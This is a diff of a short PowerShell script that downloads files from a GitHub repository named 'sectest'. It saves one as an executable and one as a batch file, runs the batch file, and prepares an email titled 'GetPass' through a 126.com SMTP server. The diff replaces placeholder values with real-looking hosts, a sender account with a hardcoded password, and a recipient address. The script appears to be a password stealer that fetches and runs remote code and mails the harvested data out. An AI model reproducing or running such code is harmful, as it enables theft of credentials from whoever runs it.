@@ -1,25 +1,25 @@
 (new-object System.Net.WebClient).DownloadFile('https://github.com/foryou123/sectest/blob/master/GetPass.rar','D:\Get.exe');
 
 
-(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');
+(new-object System.Net.WebClient).DownloadFile('https://github.com/foryou123/sectest/blob/master/Command.rar','D:\Command.bat');
 
 
 D:\Command.bat;
 
-$SMTPServer = 'smtp.qq.com'
+$SMTPServer = 'smtp.126.com'
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true 
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxxxx@qq.com', 'olawgxxxxxxx');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('free897@qq.com', 'wodemim8');
 
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = 'xxxxx@qq.com'
+$ReportEmail.From = 'free897@qq.com'
 
-$ReportEmail.To.Add('xxxxx@qq.com')
+$ReportEmail.To.Add('hiforyou@yeah.net')
 
 $ReportEmail.Subject = 'GetPass'
 
